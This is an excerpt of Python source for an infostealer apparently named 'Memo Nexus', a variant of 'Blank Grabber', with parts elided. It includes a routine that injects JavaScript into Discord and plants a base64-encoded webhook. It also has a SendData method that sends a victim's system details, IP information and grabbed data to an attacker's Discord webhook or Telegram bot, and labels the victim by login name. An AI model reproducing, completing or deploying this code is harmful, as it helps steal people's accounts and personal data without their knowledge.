...
Logger = logging.getLogger('Memo Nexus')
...
class Discord:
    ...
    def InjectJs() -> str | None:
        check = False
        try:
            code = base64.b64decode(b'WEBHOOK_HERE').decode(errors='ignore').replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors='ignore')))
        except Exception:
            return None
...
class BlankGrabber:
    ...
    def SendData(self) -> None:
        ...
        match Settings.C2[0]:
            case 0:
                image_url = 'https://cdn.discordapp.com/attachments/1197917861897842870/1204667109054091284/static_4.png?ex=65decb2c&is=65cc562c&hm=481332d23d046cac2945f147ad6c8f2da2272699ca92ab89fd51ef94899de72d&'
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'MemoNexus', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': '', 'color': 34303, 'footer': {'text': 'Grabbed by MemoNexus | https://discord.gg/Q3GVNC4B66'}, 'thumbnail': {'url': image_url}}], 'username': 'Memo Nexus', 'avatar_url': image_url}
            ...
            case 1:
                payload = {'caption': f'<b>Memo Nexus</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
